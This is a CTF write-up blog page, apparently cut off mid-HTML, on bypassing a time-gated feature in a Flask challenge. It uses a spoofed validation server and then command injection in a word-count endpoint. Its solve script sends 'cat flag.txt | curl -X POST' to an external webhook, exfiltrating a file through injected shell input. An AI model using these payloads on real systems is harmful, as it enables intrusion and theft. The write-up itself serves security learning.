<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>CyberSpace24 - Feature Unlocked | hxuu</title><meta name=keywords content="ctf,write-up,cyberspace"><meta name=description content="CTF write-up for Feature Unlocked"><meta name=author content="hxuu"><link rel=canonical href=https://hxuu.github.io/blog/ctf/cyberspace24/feature-unlocked/><link crossorigin=anonymous href=/blog/assets/css/stylesheet.e44f33264f033f576c3ce7f772762cc751d91ddb02aaa170e312a8aff988c2e6.css integrity="sha256-5E8zJk8DP1dsPOf3cnYsx1HZHdsCqqFw4xKor/mIwuY=" rel="preload stylesheet" as=style><link rel=icon href=https://hxuu.github.io/blog/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://hxuu.github.io/blog/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://hxuu.github.io/blog/favicon-32x32.png><link rel=apple-touch-icon href=https://hxuu.github.io/blog/apple-touch-icon.png><link rel=mask-icon href=https://hxuu.github.io/blog/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://hxuu.github.io/blog/ctf/cyberspace24/feature-unlocked/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:url" content="https://hxuu.github.io/blog/ctf/cyberspace24/feature-unlocked/"><meta property="og:site_name" content="hxuu"><meta property="og:title" content="CyberSpace24 - Feature Unlocked"><meta property="og:description" content="CTF write-up for Feature Unlocked"><meta property="og:locale" content="en-us"><meta property="og:type" content="article"><meta property="article:section" content="ctf"><meta property="article:published_time" content="2024-09-02T10:28:44+01:00"><meta property="article:modified_time" content="2024-09-02T10:28:44+01:00"><meta property="article:tag" content="Ctf"><meta property="article:tag" content="Write-Up"><meta property="article:tag" content="Cyberspace"><meta property="og:image" content="https://hxuu.github.io/blog/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://hxuu.github.io/blog/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="CyberSpace24 - Feature Unlocked"><meta name=twitter:description content="CTF write-up for Feature Unlocked"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Ctfs","item":"https://hxuu.github.io/blog/ctf/"},{"@type":"ListItem","position":2,"name":"CyberSpace24 - Feature Unlocked","item":"https://hxuu.github.io/blog/ctf/cyberspace24/feature-unlocked/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"CyberSpace24 - Feature Unlocked","name":"CyberSpace24 - Feature Unlocked","description":"CTF write-up for Feature Unlocked","keywords":["ctf","write-up","cyberspace"],"articleBody":"Challenge Description name: feature unlocked category: web exploitation points: 50 solves: 184 The world’s coolest app has a brand new feature! Too bad it’s not released until after the CTF..\nNote: Note: The challenge deployment will automatically restart every 15 minutes.\nAnalysis We’re given the following web page:\nIt seems that we have to unlock the new feature which is only available after the CTF ends:\nWe obviously can’t wait until the CTF ends, luckily for us, we’re given the source code for the application here\n. ├── Dockerfile ├── flag.txt ├── nsjail.cfg └── src ├── app │ ├── __init__.py │ ├── main.py │ ├── static │ │ ├── css │ │ │ ├── animations.css │ │ │ └── styles.css │ │ └── images │ │ └── logo.png │ └── templates │ ├── base.html │ ├── feature.html │ ├── index.html │ └── release.html ├── requirements.txt ├── run.sh └── validation_server └── validation.py Looking at the Dockerfile gives:\nFROM python:3.10-slim as chroot ENV PYTHONUNBUFFERED=1 RUN apt-get update \u0026\u0026 apt-get install -y curl \u0026\u0026 apt-get clean # create a /home/user and cd into it RUN mkdir -p /home/user WORKDIR /home/user # copy flag and src/ to /home/user COPY src/ flag.txt ./ RUN pip install --no-cache-dir -r requirements.txt FROM gcr.io/kctf-docker/challenge@sha256:0f7d757bcda470c3bbc063606335b915e03795d72ba1d8fdb6f0f9ff3757364f COPY --from=chroot / /chroot COPY nsjail.cfg /home/user/ CMD kctf_setup \u0026\u0026 \\ kctf_drop_privs nsjail --config /home/user/nsjail.cfg -- /home/user/run.sh This Dockerfile builds a secure CTF challenge environment:\nBuild Stage: Prepares the application by setting up Python, installing dependencies, and copying necessary files. Final Stage: Uses a secure base image, copies the prepared environment, and runs the challenge inside a restricted sandbox (nsjail). Let’s check the application now.\nmain.py import subprocess import base64 import json import time import requests import os from flask import Flask, request, render_template, make_response, redirect, url_for from Crypto.Hash import SHA256 from Crypto.PublicKey import ECC from Crypto.Signature import DSS from itsdangerous import URLSafeTimedSerializer app = Flask(__name__) app.secret_key = os.urandom(16) serializer = URLSafeTimedSerializer(app.secret_key) DEFAULT_VALIDATION_SERVER = 'http://127.0.0.1:1338' NEW_FEATURE_RELEASE = int(time.time()) + 7 * 24 * 60 * 60 DEFAULT_PREFERENCES = base64.b64encode(json.dumps({ 'theme': 'light', 'language': 'en' }).encode()).decode() def get_preferences(): preferences = request.cookies.get('preferences') if not preferences: response = make_response(render_template( 'index.html', new_feature=False)) response.set_cookie('preferences', DEFAULT_PREFERENCES) return json.loads(base64.b64decode(DEFAULT_PREFERENCES)), response return json.loads(base64.b64decode(preferences)), None @app.route('/') def index(): _, response = get_preferences() return response if response else render_template('index.html', new_feature=False) @app.route('/release') def release(): # we have to get a cookie named access_token token = request.cookies.get('access_token') if token: try: # when the token is loaded (from key that we don't know), it should equal access_granted data = serializer.loads(token) if data == 'access_granted': return redirect(url_for('feature')) except Exception as e: print(f\"Token validation error: {e}\") # have to go here validation_server = DEFAULT_VALIDATION_SERVER if request.args.get('debug') == 'true': preferences, _ = get_preferences() validation_server = preferences.get( 'validation_server', DEFAULT_VALIDATION_SERVER) if validate_server(validation_server): response = make_response(render_template( 'release.html', feature_unlocked=True)) # token has our desired access_granted dumped token = serializer.dumps('access_granted') response.set_cookie('access_token', token, httponly=True, secure=True) # feature unlocked return response return render_template('release.html', feature_unlocked=False, release_timestamp=NEW_FEATURE_RELEASE) @app.route('/feature', methods=['GET', 'POST']) def feature(): token = request.cookies.get('access_token') if not token: return redirect(url_for('index')) try: data = serializer.loads(token) if data != 'access_granted': return redirect(url_for('index')) if request.method == 'POST': # get the text from body to_process = request.form.get('text') try: # RCE here word_count = f\"echo {to_process} | wc -w\" output = subprocess.check_output( word_count, shell=True, text=True) except subprocess.CalledProcessError as e: output = f\"Error: {e}\" return render_template('feature.html', output=output) return render_template('feature.html') except Exception as e: print(f\"Error: {e}\") return redirect(url_for('index')) def get_pubkey(validation_server): try: response = requests.get(f\"{validation_server}/pubkey\") response.raise_for_status() return ECC.import_key(response.text) except requests.RequestException as e: raise Exception( f\"Error connecting to validation server for public key: {e}\") def validate_access(validation_server): pubkey = get_pubkey(validation_server) try: response = requests.get(validation_server) response.raise_for_status() data = response.json() date = data['date'].encode('utf-8') signature = bytes.fromhex(data['signature']) verifier = DSS.new(pubkey, 'fips-186-3') verifier.verify(SHA256.new(date), signature) return int(date) except requests.RequestException as e: raise Exception(f\"Error validating access: {e}\") def validate_server(validation_server): try: date = validate_access(validation_server) return date \u003e= NEW_FEATURE_RELEASE except Exception as e: print(f\"Error: {e}\") return False if __name__ == '__main__': app.run(host='0.0.0.0', port=1337) This Flask application manages feature access using a cookie-based token system. Users accessing the /release route may receive an access token if they are validated by a server. If the server’s public key verifies a valid date, the feature is unlocked, and the token is set. The /feature route allows text processing with potential Remote Code Execution (RCE) via a subprocess command. It also fetches a public key and verifies server access using digital signatures. The application defaults to a basic theme and language in user preferences, which can be updated based on cookies.\nInteresting, the server uses the validation server hosted on localhost port 1338 to validate the access. Let’s check how this latter is implemented:\nvalidation.py from flask import Flask, jsonify import time from Crypto.Hash import SHA256 from Crypto.PublicKey import ECC from Crypto.Signature import DSS app = Flask(__name__) key = ECC.generate(curve='p256') pubkey = key.public_key().export_key(format='PEM') @app.route('/pubkey', methods=['GET']) def get_pubkey(): return pubkey, 200, {'Content-Type': 'text/plain; charset=utf-8'} @app.route('/', methods=['GET']) def index(): date = str(int(time.time())) h = SHA256.new(date.encode('utf-8')) signature = DSS.new(key, 'fips-186-3').sign(h) return jsonify({ 'date': date, 'signature': signature.hex() }) if __name__ == '__main__': app.run(host='127.0.0.1', port=1338) In simple terms, this validation server helps the main application check if it should unlock features. It does this by providing a way to verify if a timestamp given by the server is genuine. When the main application asks the server, it gets a timestamp and a special code showing it’s real. The main application then uses this code to confirm that the server’s timestamp is valid before unlocking any features.\nIn more technical terms, the validation server returns a date which is later compared to the NEW_FEATURE_RELEASE date, if the date given by the validation server is greater than the latter, the feature is unlocked (access_granted set, by extension we get RCE)\n# validate server function date = validate_access(validation_server) return date \u003e= NEW_FEATURE_RELEASE However, the server used by the application currently doesn’t serve us well. Only if we could redirect the application onto a server of our own…\nIt turns out, when the debug query parameter is set to true in the /release route, the application allows overriding the default validation server with one specified in the user’s cookie preferences. If the custom server is validated successfully, it may issue an access token granting feature access. This setup could potentially be exploited if the custom validation server is not securely configured.\nThis is exactly what we want, we can host our own server which instead of returning the current date, it returns a date greater that NEW_FEATURE_RELEASE. After that, we can send a POST request to /feature with text equal to our payload which retrieves the flag.txt file.\nExploitation Let’s first write our own custom-validation.py server, host it and tunnel our localhost using beeceptor\ncustom-validation.py from flask import Flask, jsonify, request import time from Crypto.Hash import SHA256 from Crypto.PublicKey import ECC from Crypto.Signature import DSS app = Flask(__name__) # Generate a key and public key key = ECC.generate(curve='p256') pubkey = key.public_key().export_key(format='PEM') # Constants DEFAULT_VALIDATION_SERVER = 'http://127.0.0.1:1338' @app.route('/pubkey', methods=['GET']) def get_pubkey(): return pubkey, 200, {'Content-Type': 'text/plain; charset=utf-8'} @app.route('/', methods=['GET']) def index(): date = str(int(time.time())) h = SHA256.new(date.encode('utf-8')) signature = DSS.new(key, 'fips-186-3').sign(h) # Bypass validation by always returning a valid date and signature # Ensure the date is in the future to always pass the validation valid_date = str(int(time.time()) + 10 * 24 * 60 * 60) # Valid for 10 days in the future valid_signature = DSS.new(key, 'fips-186-3').sign(SHA256.new(valid_date.encode('utf-8'))) return jsonify({ 'date': valid_date, 'signature': valid_signature.hex() }) if __name__ == '__main__': app.run(host='127.0.0.1', port=1338) This here always returns a valid date. Let’s now create our gen.py script to get the acess_granted cookie.\ngen.py import requests import base64 import json import time # Configuration BASE_URL = 'https://feature-unlocked-web.challs.csc.tf' RELEASE_ENDPOINT = '/release' PREFERENCES_COOKIE_NAME = 'preferences' DEFAULT_PREFERENCES = { 'theme': 'light', 'language': 'en', 'validation_server': 'https://.free.beeceptor.com' # This should match the modified validation server URL } # Encode preferences as base64 encoded_preferences = base64.b64encode( json.dumps(DEFAULT_PREFERENCES).encode() ).decode() # Set the preferences cookie value cookies = { PREFERENCES_COOKIE_NAME: encoded_preferences } # Make the GET request to /release with debug=true response = requests.get( f'{BASE_URL}{RELEASE_ENDPOINT}', params={'debug': 'true'}, cookies=cookies, allow_redirects=False # Avoid following redirects to see the response directly ) # Print the response print(f\"Status Code: {response.status_code}\") print(f\"Response Headers: {response.headers}\") print(f\"Response Text: {response.text}\") # If the response includes a 'Set-Cookie' header, print it to check the access_token if 'Set-Cookie' in response.headers: print(f\"Set-Cookie Header: {response.headers['Set-Cookie']}\") Running python gen.py should give us the token\nAnd it did! Let’s now craft another script solve.py to retrieve the flag.txt\nsolve.py import requests # Replace these values with your actual values access_token = 'ImFjY2Vzc19ncmFudGVkIg.ZtWNIQ.efPFQEBT8jNFoIlWVhjSeYC2Iuk' feature_url = 'https://feature-unlocked-web.challs.csc.tf/feature' # Text to be sent to the /feature endpoint for word count testing text_body = 'This; cat flag.txt | curl -X POST -d @- https://webhook.site/ea19e1c2-91bb-469b-bfd4-8f3608541e56' # Create the headers with the access token headers = { 'Cookie': f'access_token={access_token}' } # Create the payload with the text to be processed data = { 'text': text_body } # Make the POST request to the /feature endpoint response = requests.post(feature_url, headers=headers, data=data) # Print the response from the server print(f\"Status Code: {response.status_code}\") print(\"Response Content:\") print(response.text) Running python solve.py should send a request to our webhook, and we should see the flag there.\nThere we go~ flag is: CSCTF{d1d_y0u_71m3_7r4v3l_f0r_7h15_fl46?!}\nFrom this challenge, we learned the importance of:\nUnderstanding Validation Mechanisms: Knowing how to manipulate and bypass validation checks can help in exploiting such features. Using Debug Parameters: Identifying how debug modes or parameters can be leveraged to control or redirect application behavior. Remote Code Execution (RCE): Recognizing and exploiting RCE vulnerabilities, especially in contexts where subprocess commands are involved. Custom Validation Servers: Realizing the risks of trusting external or custom validation servers without proper security checks. ","wordCount":"1579","inLanguage":"en","image":"https://hxuu.github.io/blog/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E","datePublished":"2024-09-02T10:28:44+01:00","dateModified":"2024-09-02T10:28:44+01:00","author":{"@type":"Person","name":"hxuu"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://hxuu.github.io/blog/ctf/cyberspace24/feature-unlocked/"},"publisher":{"@type":"Organization","name":"hxuu","logo":{"@type":"ImageObject","url":"https://hxuu.github.io/blog/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://hxuu.github.io/blog/ accesskey=h title="hxuu (Alt + H)"><img src=https://hxuu.github.io/apple-touch-icon.png alt aria-label=logo height=35>hxuu</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://hxuu.github.io/blog/ctf/ title=CTFs><span>CTFs</span></a></li><li><a href=https://hxuu.github.io/blog/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li><li><a href=https://hxuu.github.io/blog/tags/ title=Tags><span>Tags</span></a></li><li><a href=https://github.com/hxuu title="About Me"><span>About Me</span>&nbsp;
<svg fill="none" shape-rendering="geometricPrecision" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12"><path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"/><path d="M15 3h6v6"/><path d="M10 14 21 3"/></svg></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://hxuu.github.io/blog/>Home</a>&nbsp;»&nbsp;<a href=https://hxuu.github.io/blog/ctf/>Ctfs</a></div><h1 class="post-title entry-hint-parent">CyberSpace24 - Feature Unlocked</h1><div class=post-description>CTF write-up for Feature Unlocked</div><div class=post-meta><span title='2024-09-02 10:28:44 +0100 CET'>September 2, 2024</span>&nbsp;·&nbsp;8 min&nbsp;·&nbsp;hxuu&nbsp;|&nbsp;<a href=https://github.com/hxuu/content/ctf/cyberspace24/feature-unlocked.md rel="noopener noreferrer edit" target=_blank>Suggest Changes</a></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#challenge-description>Challenge Description</a></li><li><a href=#analysis>Analysis</a><ul><li><a href=#mainpy><code>main.py</code></a></li><li><a href=#validationpy><code>validation.py</code></a></li></ul></li><li><a href=#exploitation>Exploitation</a><ul><li><a href=#custom-validationpy><code>custom-validation.py</code></a></li><li><a href=#genpy><code>gen.py</code></a></li><li><a href=#solvepy><code>solve.py</code></a></li></ul></li></ul></nav></div></details></div><div class=post-content><h2 id=challenge-description>Challenge Description<a hidden class=anchor aria-hidden=true href=#challenge-description>#</a></h2><pre tabindex=0><code>name: feature unlocked
category: web exploitation
points: 50
solves: 184
</code></pre><p>The world&rsquo;s coolest app has a brand new feature! Too bad it&rsquo;s not released until after the CTF..</p><blockquote><p>Note: Note: The challenge deployment will automatically restart every 15 minutes.</p></blockquote><h2 id=analysis>Analysis<a hidden class=anchor aria-hidden=true href=#analysis>#</a></h2><p>We&rsquo;re given the following web page:</p><p><img alt=initial loading=lazy src=/blog/images/2024-09-02-10-32-42.png></p><p>It seems that we have to unlock the new feature which is only available after the CTF ends:</p><p><img alt=feature-initial loading=lazy src=/blog/images/2024-09-02-10-33-19.png></p><p>We obviously can&rsquo;t wait until the CTF ends, luckily for us, we&rsquo;re given the source code
for the application <a href="https://2024.csc.tf/files/2fcb84a23fe1a4a6453f4345951a062c/handout_featur_eunlocked.zip?token=eyJ1c2VyX2lkIjo4MDEsInRlYW1faWQiOjQwMCwiZmlsZV9pZCI6NTJ9.ZtWnVA.Go_XGd7hv5RMCLcG43jU7YpMRNU">here</a></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>.
</span></span><span class=line><span class=cl>├── Dockerfile
</span></span><span class=line><span class=cl>├── flag.txt
</span></span><span class=line><span class=cl>├── nsjail.cfg
</span></span><span class=line><span class=cl>└── src
</span></span><span class=line><span class=cl>    ├── app
</span></span><span class=line><span class=cl>    │   ├── __init__.py
</span></span><span class=line><span class=cl>    │   ├── main.py
</span></span><span class=line><span class=cl>    │   ├── static
</span></span><span class=line><span class=cl>    │   │   ├── css
</span></span><span class=line><span class=cl>    │   │   │   ├── animations.css
</span></span><span class=line><span class=cl>    │   │   │   └── styles.css
</span></span><span class=line><span class=cl>    │   │   └── images
</span></span><span class=line><span class=cl>    │   │       └── logo.png
</span></span><span class=line><span class=cl>    │   └── templates
</span></span><span class=line><span class=cl>    │       ├── base.html
</span></span><span class=line><span class=cl>    │       ├── feature.html
</span></span><span class=line><span class=cl>    │       ├── index.html
</span></span><span class=line><span class=cl>    │       └── release.html
</span></span><span class=line><span class=cl>    ├── requirements.txt
</span></span><span class=line><span class=cl>    ├── run.sh
</span></span><span class=line><span class=cl>    └── validation_server
</span></span><span class=line><span class=cl>        └── validation.py
</span></span></code></pre></div><p>Looking at the Dockerfile gives:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-Dockerfile data-lang=Dockerfile><span class=line><span class=cl><span class=k>FROM</span><span class=s> python:3.10-slim as chroot</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>ENV</span> <span class=nv>PYTHONUNBUFFERED</span><span class=o>=</span><span class=m>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>RUN</span> apt-get update <span class=o>&amp;&amp;</span> apt-get install -y curl <span class=o>&amp;&amp;</span> apt-get clean<span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=c># create a /home/user and cd into it</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>RUN</span> mkdir -p /home/user<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>WORKDIR</span><span class=s> /home/user</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=c># copy flag and src/ to /home/user</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>COPY</span> src/ flag.txt ./<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>RUN</span> pip install --no-cache-dir -r requirements.txt<span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>FROM</span><span class=s> gcr.io/kctf-docker/challenge@sha256:0f7d757bcda470c3bbc063606335b915e03795d72ba1d8fdb6f0f9ff3757364f</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>COPY</span> --from<span class=o>=</span>chroot / /chroot<span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>COPY</span> nsjail.cfg /home/user/<span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>CMD</span> kctf_setup <span class=o>&amp;&amp;</span> <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    kctf_drop_privs nsjail --config /home/user/nsjail.cfg -- /home/user/run.sh<span class=err>
</span></span></span></code></pre></div><p>This Dockerfile builds a secure CTF challenge environment:</p><ol><li><strong>Build Stage</strong>: Prepares the application by setting up Python, installing dependencies, and copying necessary files.</li><li><strong>Final Stage</strong>: Uses a secure base image, copies the prepared environment, and runs the challenge inside a restricted sandbox (<code>nsjail</code>).</li></ol><p>Let&rsquo;s check the application now.</p><h3 id=mainpy><code>main.py</code><a hidden class=anchor aria-hidden=true href=#mainpy>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>subprocess</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>base64</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>json</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>flask</span> <span class=kn>import</span> <span class=n>Flask</span><span class=p>,</span> <span class=n>request</span><span class=p>,</span> <span class=n>render_template</span><span class=p>,</span> <span class=n>make_response</span><span class=p>,</span> <span class=n>redirect</span><span class=p>,</span> <span class=n>url_for</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Hash</span> <span class=kn>import</span> <span class=n>SHA256</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.PublicKey</span> <span class=kn>import</span> <span class=n>ECC</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Signature</span> <span class=kn>import</span> <span class=n>DSS</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>itsdangerous</span> <span class=kn>import</span> <span class=n>URLSafeTimedSerializer</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>app</span> <span class=o>=</span> <span class=n>Flask</span><span class=p>(</span><span class=vm>__name__</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>app</span><span class=o>.</span><span class=n>secret_key</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>urandom</span><span class=p>(</span><span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>serializer</span> <span class=o>=</span> <span class=n>URLSafeTimedSerializer</span><span class=p>(</span><span class=n>app</span><span class=o>.</span><span class=n>secret_key</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>DEFAULT_VALIDATION_SERVER</span> <span class=o>=</span> <span class=s1>&#39;http://127.0.0.1:1338&#39;</span>
</span></span><span class=line><span class=cl><span class=n>NEW_FEATURE_RELEASE</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>())</span> <span class=o>+</span> <span class=mi>7</span> <span class=o>*</span> <span class=mi>24</span> <span class=o>*</span> <span class=mi>60</span> <span class=o>*</span> <span class=mi>60</span>
</span></span><span class=line><span class=cl><span class=n>DEFAULT_PREFERENCES</span> <span class=o>=</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64encode</span><span class=p>(</span><span class=n>json</span><span class=o>.</span><span class=n>dumps</span><span class=p>({</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;theme&#39;</span><span class=p>:</span> <span class=s1>&#39;light&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;language&#39;</span><span class=p>:</span> <span class=s1>&#39;en&#39;</span>
</span></span><span class=line><span class=cl><span class=p>})</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_preferences</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>preferences</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>cookies</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;preferences&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>preferences</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>response</span> <span class=o>=</span> <span class=n>make_response</span><span class=p>(</span><span class=n>render_template</span><span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=s1>&#39;index.html&#39;</span><span class=p>,</span> <span class=n>new_feature</span><span class=o>=</span><span class=kc>False</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=n>response</span><span class=o>.</span><span class=n>set_cookie</span><span class=p>(</span><span class=s1>&#39;preferences&#39;</span><span class=p>,</span> <span class=n>DEFAULT_PREFERENCES</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>json</span><span class=o>.</span><span class=n>loads</span><span class=p>(</span><span class=n>base64</span><span class=o>.</span><span class=n>b64decode</span><span class=p>(</span><span class=n>DEFAULT_PREFERENCES</span><span class=p>)),</span> <span class=n>response</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>json</span><span class=o>.</span><span class=n>loads</span><span class=p>(</span><span class=n>base64</span><span class=o>.</span><span class=n>b64decode</span><span class=p>(</span><span class=n>preferences</span><span class=p>)),</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>index</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>_</span><span class=p>,</span> <span class=n>response</span> <span class=o>=</span> <span class=n>get_preferences</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>response</span> <span class=k>if</span> <span class=n>response</span> <span class=k>else</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;index.html&#39;</span><span class=p>,</span> <span class=n>new_feature</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/release&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>release</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=c1># we have to get a cookie named access_token</span>
</span></span><span class=line><span class=cl>    <span class=n>token</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>cookies</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;access_token&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>token</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=c1># when the token is loaded (from key that we don&#39;t know), it should equal access_granted</span>
</span></span><span class=line><span class=cl>            <span class=n>data</span> <span class=o>=</span> <span class=n>serializer</span><span class=o>.</span><span class=n>loads</span><span class=p>(</span><span class=n>token</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>data</span> <span class=o>==</span> <span class=s1>&#39;access_granted&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=n>redirect</span><span class=p>(</span><span class=n>url_for</span><span class=p>(</span><span class=s1>&#39;feature&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Token validation error: </span><span class=si>{</span><span class=n>e</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
